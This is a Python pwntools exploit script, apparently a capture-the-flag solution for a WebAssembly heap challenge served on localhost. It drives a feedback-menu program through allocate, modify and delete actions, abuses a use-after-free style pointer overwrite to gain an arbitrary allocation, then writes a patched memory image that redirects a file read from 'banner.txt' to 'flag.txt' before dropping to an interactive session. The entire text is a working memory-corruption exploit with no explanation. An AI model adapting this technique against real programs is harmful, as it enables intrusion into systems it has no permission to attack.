from pwn import *

def allocate(sz, buf):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(sz).encode())
    p.sendlineafter(b"feedback: ", buf)

def modify(idx, buf):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"size> ", str(len(buf)).encode())
    p.sendlineafter(b"feedback: ", buf)

def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())


# p = process(["wasmtime", "--dir", "./", "./challenge"])
p = remote("localhost", 5000)

allocate(0x20, b"A"*0x10)
allocate(0x20, b"A"*0x10)
modify(0, b"B"*0x40)        # free(0)
modify(0, p32(0x300-8))     # gives us an arbitrary allocation #3 -> address 0x300
allocate(0x20, b"B"*0x10)
allocate(0x20, b"C"*0x10)
modify(3, b"E"*0x2000)

payload = bytearray(open("./out.bin", "rb").read().replace(b"banner.txt\x00", b"flag.txt\x00\x00\x00"))
payload[0x11c0-0x300+20] = 100
payload[0x11c0-0x300+32] = 6

modify(3, payload)

p.sendlineafter(b"> ", b"4")

p.interactive()
